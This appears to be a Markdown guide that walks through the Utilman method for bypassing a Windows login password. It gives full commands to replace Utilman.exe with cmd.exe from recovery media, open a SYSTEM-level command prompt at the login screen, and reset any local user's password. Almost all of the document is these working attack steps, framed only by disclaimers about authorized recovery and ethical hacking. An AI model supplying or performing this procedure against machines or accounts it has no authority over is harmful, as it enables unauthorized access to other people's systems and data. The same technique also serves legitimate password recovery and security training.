✅ Utilman Method – Bypass Windows Password

# 🧰 Bypass Windows Password Using Utilman (`Ease of Access` Exploit)

This method involves replacing `Utilman.exe` (Ease of Access utility) with `cmd.exe`. At the login screen, clicking the **Accessibility icon** launches a system-level Command Prompt instead, which can be used to reset any local user password.

> ⚠️ For educational and authorized system recovery only.

---

## 🛠️ Requirements

- Physical access to the target machine
- Windows installation or recovery media (USB/DVD)

---

## 🚀 Steps to Bypass Password Using Utilman

### 1️⃣ Boot Into Recovery Environment

1. Insert a Windows bootable USB/DVD.
2. Restart the PC and boot into the media.
3. On the setup screen, press `Shift + F10` to open **Command Prompt**.

---

### 2️⃣ Backup the Original Utilman

```cmd
copy C:\Windows\System32\Utilman.exe C:\Windows\System32\Utilman.exebak
````

✔️ This step saves a backup copy for restoration later.

---

### 3️⃣ Replace Utilman With Command Prompt

```cmd
copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe /y
```

✔️ This will make CMD open when the Accessibility icon is clicked at login.

---

### 4️⃣ Restart and Launch CMD From Login Screen

1. Close all windows and restart the computer.
2. On the Windows login screen, click the **Accessibility (☰)** icon in the bottom-right.

✅ A system-level Command Prompt will open.

---

### 5️⃣ Reset the Password

1. List admin users:

   ```cmd
   net localgroup administrators
   ```

2. Reset the password of the target user:

   ```cmd
   net user <username> *
   ```

Replace `<username>` with the actual account name. You'll be prompted to enter a new password.

---

### 6️⃣ Log In With the New Password

* Close CMD and log in to Windows using the newly set password.

---

### 7️⃣ Restore Original Utilman (Recommended)

After logging in successfully, open CMD and run:

```cmd
copy C:\Windows\System32\Utilman.exebak C:\Windows\System32\Utilman.exe /y
```

✅ This restores the original Ease of Access tool.

---

## ⚠️ Important Notes

* Will not work if the drive is BitLocker encrypted.
* CMD launched this way runs with SYSTEM privileges — use responsibly.
* Always back up system files before replacing.

---

## 🛡️ Legal Disclaimer

This method is for:

* Ethical hacking education
* System recovery for authorized users
* Security awareness and training

❌ Do not use for unauthorized access. Misuse is illegal.

---

🔐 *Recover responsibly. Hack ethically.*

```
